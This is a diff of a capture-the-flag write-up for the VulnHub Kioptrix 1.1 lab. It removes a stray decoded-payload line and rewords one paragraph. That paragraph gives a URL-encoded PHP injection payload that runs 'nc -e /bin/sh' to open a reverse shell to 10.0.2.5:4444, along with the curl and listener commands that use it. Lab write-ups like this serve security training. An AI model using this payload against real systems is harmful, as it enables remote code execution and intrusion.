@@ -1,5 +1,3 @@
-%27%29%3B%24%7Bsystem%28%27nc%20-e%20%2fbin%2fsh%2010.0.2.5%204444%27%29%7D%3B%23%22 -> ');${system('nc -e /bin/sh 10.0.2.5 4444')};#"
-
 # Kioptrix 1.1 Writeup
 
 This vulnerable virtual machine was obtained from [VulnHub](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/ "URL for kioptrix 1.1"). The kioptrix series are intended for use with VMWare, but by following the instructions found [here](http://hypn.za.net/blog/2017/07/15/running-kioptrix-level-1-and-others-in-virtualbox/ "running kioptrix in VirtualBox"), you can get the virtual machines to work with VirtualBox.
@@ -66,7 +64,7 @@ To make this attack easier to carry out, I'll be using the cURL utility to make 
 
 ![](images/curlphp.png "Performing the code injection with cURL")
 
-Now that we know that we can execute arbitray PHP code on the web server, we can set up a shell for us to use with `nc` and a crafted web request. On the attacking machine, we'll use the command `nc -lvp 4444` so that `nc` listens on port 4444 for a connection. Then, we'll use cURL again with the command `curl -X POST http://10.0.2.7/index.php?page=%27%29%3B%24%7Bsystem%28%27nc%20-e%20%2fbin%2fsh%2010.0.2.5%204444%27%29%7D%3B%23%22`. This URL encodes the PHP code `');${system('nc -e /bin/sh 10.0.2.5 4444')};#"`, which will spawn an instance of /bin/sh with its input and output redirected to the given IP and port, essentially allowing us to have a shell.
+Now that we know we can execute arbitray PHP code on the web server, we can set up a shell for us to use with `nc` and a crafted web request. On the attacking machine, we'll use the command `nc -lvp 4444` so that `nc` listens on port 4444 for a connection. Then, we'll use cURL again with the command `curl -X POST http://10.0.2.7/index.php?page=%27%29%3B%24%7Bsystem%28%27nc%20-e%20%2fbin%2fsh%2010.0.2.5%204444%27%29%7D%3B%23%22`. This URL encodes the PHP code `');${system('nc -e /bin/sh 10.0.2.5 4444')};#"`, which will spawn an instance of /bin/sh with its input and output redirected to the given IP and port, essentially allowing us to have a shell.
 
 ![](images/ncshell.png "Spawning a shell with nc")
 
